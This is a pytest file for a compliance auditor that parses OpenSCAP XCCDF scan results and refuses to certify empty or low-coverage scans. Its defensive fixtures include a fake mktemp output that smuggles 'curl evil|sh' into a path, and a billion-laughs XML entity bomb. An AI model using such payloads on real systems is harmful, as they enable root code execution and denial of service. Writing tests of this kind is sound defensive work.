"""Tests for grc_auditor.scan.parse_xccdf_results against namespaced XCCDF.

The fixtures under tests/fixtures/ are namespaced XCCDF 1.2 documents shaped
like real `oscap xccdf eval --results` output; the parser strips namespaces by
local-name, so the namespace prefix is exercised on purpose.
"""

from __future__ import annotations

import pytest

from grc_auditor.detect import ScanPlan
from grc_auditor.models import (
    HostRecord, HostStatus, ScanResult, finalize_scan_status,
)
from grc_auditor.remote import CommandResult
from grc_auditor.scan import parse_xccdf_results, scan_host

from conftest import FakeRemoteHost, fixture_path


# --- remote command-injection guard (a hostile target must not get root RCE) ---

def _plan():
    return ScanPlan(datastream_path="/usr/share/xml/scap/ssg/ds.xml",
                    profile_id="cis_level1_server", cis_level=1,
                    ubuntu_version="22.04")


def test_malicious_mktemp_output_is_refused(tmp_path):
    # A compromised target whose `mktemp` emits a shell-injection payload must be
    # refused before that string can reach a sudo command -- not run as root.
    conn = FakeRemoteHost(responses=[
        ("mktemp", CommandResult(0, "/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
    ])
    host = HostRecord(ip="10.0.0.9")
    with pytest.raises(RuntimeError):
        scan_host(host, conn, _plan(), "runid", str(tmp_path))
    assert host.status is HostStatus.SCAN_ERROR
    assert "unexpected path" in (host.detail or "")


def test_scan_host_happy_path_marks_scanned(tmp_path):
    results_xml = open(fixture_path("xccdf-results.xml"), encoding="utf-8").read()
    conn = FakeRemoteHost(
        responses=[
            ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
            ("xccdf eval", CommandResult(0, "", "")),
            ("test -f", CommandResult(0, "", "")),
        ],
        files={"results.xml": results_xml},
    )
    host = HostRecord(ip="10.0.0.9")
    scan = scan_host(host, conn, _plan(), "runid", str(tmp_path))
    assert host.status is HostStatus.SCANNED
    assert (scan.passed, scan.failed) == (3, 2)


def test_scan_host_oscap_error_marks_scan_error(tmp_path):
    conn = FakeRemoteHost(responses=[
        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
        ("xccdf eval", CommandResult(1, "", "bad profile")),
    ])
    host = HostRecord(ip="10.0.0.9")
    with pytest.raises(RuntimeError):
        scan_host(host, conn, _plan(), "runid", str(tmp_path))
    assert host.status is HostStatus.SCAN_ERROR


def test_scan_host_no_results_file_marks_scan_error(tmp_path):
    # oscap exited success but produced no results.xml -> a gap, not a clean pass.
    conn = FakeRemoteHost(responses=[
        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
        ("xccdf eval", CommandResult(0, "", "")),
        ("test -f", CommandResult(1, "", "")),
    ])
    host = HostRecord(ip="10.0.0.9")
    with pytest.raises(RuntimeError):
        scan_host(host, conn, _plan(), "runid", str(tmp_path))
    assert host.status is HostStatus.SCAN_ERROR


# --- scan chokepoint (never-false-pass: zero-outcome / sub-floor != SCANNED) --

def _scan(passed=0, failed=0, error=0, not_applicable=0, not_checked=0,
          other=0, score=None):
    return ScanResult(profile_id="p", datastream="d", passed=passed, failed=failed,
                      error=error, not_applicable=not_applicable,
                      not_checked=not_checked, other=other, score=score)


def test_zero_outcome_scan_is_not_certified_scanned():
    # An oscap success that produced no rule outcomes must NOT read as a clean host.
    host = HostRecord(ip="10.0.0.9")
    finalize_scan_status(host, _scan())          # all zeros -> evaluated nothing
    assert host.status is HostStatus.SCAN_ERROR
    assert host.scan is not None                  # evidence still attached
    assert "no rule outcomes" in host.detail


def test_sub_floor_confidence_scan_is_not_certified_scanned():
    # 100% score but only 10 of 200 checks ran -> 5% confidence, below the hard
    # floor. A near-empty scan can never be SCANNED regardless of the badge knob.
    host = HostRecord(ip="10.0.0.9")
    finalize_scan_status(host, _scan(passed=10, not_checked=190, score=100.0))
    assert host.status is HostStatus.SCAN_ERROR
    assert "hard floor" in host.detail


def test_adequately_covered_scan_is_scanned():
    # 70% definitive -> above the floor; a real (if still badge-low) scan.
    host = HostRecord(ip="10.0.0.9")
    finalize_scan_status(host, _scan(passed=70, failed=0, not_checked=30, score=100.0))
    assert host.status is HostStatus.SCANNED


def test_notselected_heavy_scan_is_certified_scanned():
    # A complete scan whose datastream is mostly out-of-profile (notselected ->
    # `other`) certifies as SCANNED -- notselected rules are not "unrun" checks.
    host = HostRecord(ip="10.0.0.9")
    finalize_scan_status(host, _scan(passed=238, failed=109, not_applicable=51,
                                     other=241, score=69.4))
    assert host.status is HostStatus.SCANNED


def test_all_notselected_scan_is_not_certifiable():
    # Degenerate: oscap emitted outcomes but none owed a verdict (all notselected).
    # Nothing to certify -> SCAN_ERROR, never a clean pass (never-false-pass).
    host = HostRecord(ip="10.0.0.9")
    finalize_scan_status(host, _scan(other=17))
    assert host.status is HostStatus.SCAN_ERROR
    assert host.scan is not None              # evidence still attached


def test_empty_results_file_does_not_become_a_clean_scanned_host(tmp_path):
    # End-to-end: an empty results.xml parses to all-zeros (not a crash), and the
    # chokepoint then refuses to certify it as SCANNED.
    p = tmp_path / "results.xml"
    p.write_text("", encoding="utf-8")
    scan = parse_xccdf_results(str(p))
    assert scan.total_outcomes == 0
    host = HostRecord(ip="10.0.0.9")
    finalize_scan_status(host, scan)
    assert host.status is HostStatus.SCAN_ERROR


_BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<TestResult>&lol3;</TestResult>
"""


def test_entity_expansion_in_results_is_blocked(tmp_path):
    # results.xml comes from a possibly-hostile target; a nested-entity document
    # must be refused (defusedxml), not expanded into a run-host DoS.
    p = tmp_path / "results.xml"
    p.write_text(_BILLION_LAUGHS, encoding="utf-8")
    with pytest.raises(ValueError):
        parse_xccdf_results(str(p))


_DIRTY_RESULTS = """<?xml version="1.0"?>
<Benchmark>
  <Rule id="xccdf_org.ssgproject.content_rule_dirty"><title>Bad
Title\tHere</title></Rule>
  <TestResult>
    <rule-result idref="xccdf_org.ssgproject.content_rule_dirty" severity="high">
      <result>fail</result>
    </rule-result>
  </TestResult>
</Benchmark>"""


def test_target_supplied_fields_are_control_char_stripped(tmp_path):
    # Defense in depth: a hostile rule title with embedded control bytes is
    # bounded before it reaches the report model.
    p = tmp_path / "results.xml"
    p.write_text(_DIRTY_RESULTS, encoding="utf-8")
    scan = parse_xccdf_results(str(p))
    fr = scan.failed_rules[0]
    assert fr.title == "BadTitleHere"          # newline + tab stripped


def test_canonical_fixture_does_not_trip_reconciliation_warning(caplog):
    # The canonical result (3 pass / 2 fail -> flat ~60 vs weighted score 86.5)
    # is a legitimate CIS weighted-scoring divergence. It must NOT emit the
    # "verify raw evidence" warning, or the alarm trains operators to ignore it.
    import logging

    with caplog.at_level(logging.WARNING):
        parse_xccdf_results(fixture_path("xccdf-results.xml"))
    assert not any("verify raw evidence" in r.message for r in caplog.records)


def test_counts_score_and_failures():
    scan = parse_xccdf_results(fixture_path("xccdf-results.xml"))

    # 3 pass, 2 fail, 1 notapplicable, 1 notchecked, 0 error
    assert scan.passed == 3
    assert scan.failed == 2
    assert scan.error == 0
    assert scan.not_applicable == 1
    assert scan.not_checked == 1
    assert scan.other == 0

    # total_evaluated only counts pass + fail + error (see models.ScanResult)
    assert scan.total_evaluated == 5

    # score parsed from the <score> element text
    assert scan.score == 86.5

    # benchmark version captured from the first <version> element
    assert scan.benchmark_version == "0.1.70"

    # parse_xccdf_results itself does not set profile_id/datastream
    # (scan_host overrides those after the fact)
    assert scan.profile_id == ""
    assert scan.datastream == ""


def test_failed_rules_ids_and_severities():
    scan = parse_xccdf_results(fixture_path("xccdf-results.xml"))

    assert len(scan.failed_rules) == 2
    failed = {fr.rule_id: fr for fr in scan.failed_rules}

    root_login = failed["xccdf_org.ssgproject.content_rule_sshd_disable_root_login"]
    assert root_login.result == "fail"
    assert root_login.severity == "high"
    # title attached from the Benchmark's <Rule><title>
    assert root_login.title == "Disable SSH Root Login"

    time_change = failed["xccdf_org.ssgproject.content_rule_audit_rules_time_change"]
    assert time_change.result == "fail"
    assert time_change.severity == "medium"
    assert time_change.title == "Record Events That Modify Date and Time Information"


def test_only_failures_are_retained_in_failed_rules():
    scan = parse_xccdf_results(fixture_path("xccdf-results.xml"))
    ids = {fr.rule_id for fr in scan.failed_rules}
    # passing / notapplicable / notchecked rules must NOT appear
    assert "xccdf_org.ssgproject.content_rule_package_aide_installed" not in ids
    assert "xccdf_org.ssgproject.content_rule_grub2_uefi_password" not in ids
    assert all(fr.result == "fail" for fr in scan.failed_rules)


def test_missing_score_yields_none_without_error():
    scan = parse_xccdf_results(fixture_path("xccdf-results-no-score.xml"))
    assert scan.score is None
    # parsing still succeeds: 1 pass, 1 fail
    assert scan.passed == 1
    assert scan.failed == 1
    assert len(scan.failed_rules) == 1
    assert scan.failed_rules[0].severity == "high"


def test_assessment_confidence_reflects_unrun_checks():
    # Fixture has 3 pass + 2 fail + 1 notapplicable + 1 notchecked = 7 outcomes,
    # 6 of which are definitive (pass/fail/notapplicable) -> 85.7% confidence.
    scan = parse_xccdf_results(fixture_path("xccdf-results.xml"))
    assert scan.total_outcomes == 7
    assert scan.assessment_confidence == 85.7


def test_low_privilege_scan_collapses_confidence():
    # The worst-case shape: a perfect score that only reflects the few checks
    # that actually ran. Confidence must expose it.
    from grc_auditor.models import ScanResult
    s = ScanResult(profile_id="", datastream="",
                   passed=10, failed=0, not_checked=190, score=100.0)
    assert s.score == 100.0                   # looks clean...
    assert s.assessment_confidence == 5.0     # ...but only 10 of 200 ran


def test_notselected_outcomes_do_not_lower_confidence():
    # A real complete scan's shape: 0 error, 0 notchecked, but the datastream
    # carries 241 rules outside the CIS profile (notselected -> `other`). Those
    # are out of scope, not "checks that did not run" -- they must not drag
    # confidence down or fire the LOW-confidence / insufficient-privilege alarm.
    s = _scan(passed=238, failed=109, not_applicable=51, other=241, score=69.4)
    assert s.total_outcomes == 639            # raw evidence count still counts `other`
    assert s.undetermined == 0                # nothing was left unanswered
    assert s.assessment_confidence == 100.0
    assert not s.is_low_confidence()


def test_is_low_confidence_predicate():
    # The single low-confidence rule, threshold-driven.
    from grc_auditor.models import ScanResult
    s = ScanResult(profile_id="", datastream="",
                   passed=10, failed=0, not_checked=190)  # 5% confidence
    assert s.is_low_confidence(90.0) is True
    assert s.is_low_confidence(2.0) is False
    # nothing evaluated -> confidence None -> not flagged
    assert ScanResult(profile_id="", datastream="").is_low_confidence(90.0) is False
